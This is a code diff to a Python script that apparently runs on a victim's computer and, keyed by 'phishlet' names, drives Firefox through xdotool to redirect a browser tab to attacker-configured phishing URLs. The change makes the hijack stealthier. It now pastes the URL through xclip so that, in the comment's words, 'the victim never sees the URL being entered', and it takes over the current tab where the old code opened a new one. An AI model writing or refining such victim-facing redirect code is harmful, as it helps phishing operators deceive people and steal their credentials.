@@ -269,7 +269,11 @@ def send_visit(phishlet_key, url):
 
 
 def navigate(url):
-    """Open a new tab in Firefox with the redirect URL via xdotool."""
+    """Navigate the current Firefox tab to the redirect URL via xdotool.
+
+    Uses clipboard paste instead of typing so the victim never sees
+    the URL being entered character-by-character in the address bar.
+    """
     try:
         result = subprocess.run(
             ["xdotool", "search", "--class", "firefox"],
@@ -281,14 +285,15 @@ def navigate(url):
             return False
         wid = wids[-1]
         subprocess.run(["xdotool", "windowactivate", "--sync", wid], timeout=5)
-        time.sleep(0.2)
-        # Open in a new tab to not interrupt whatever the victim is doing
-        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+t"], timeout=3)
-        time.sleep(0.2)
-        subprocess.run(["xdotool", "type", "--clearmodifiers", url], timeout=5)
-        time.sleep(0.2)
+        time.sleep(0.1)
+        # Put the URL into the clipboard, then paste it instantly
+        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+l"], timeout=3)
+        time.sleep(0.1)
+        subprocess.run(["xclip", "-selection", "clipboard"], input=url.encode(), timeout=3)
+        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+v"], timeout=3)
+        time.sleep(0.1)
         subprocess.run(["xdotool", "key", "--clearmodifiers", "Return"], timeout=3)
-        log(f"navigate: opened new tab to {url}")
+        log(f"navigate: redirected current tab to {url}")
         return True
     except Exception as e:
         log(f"navigate error: {e}")
@@ -345,7 +350,7 @@ def main():
                 send_visit(phishlet_key, url)
                 target = get_redirect_url(phishlet_key)
                 if target:
-                    log(f"[{phishlet_key}] redirecting to {target}")
+                    log(f"[{phishlet_key}] redirected current tab to {target}")
                     navigate(target)
                 else:
                     log(f"[{phishlet_key}] no redirect URL configured")
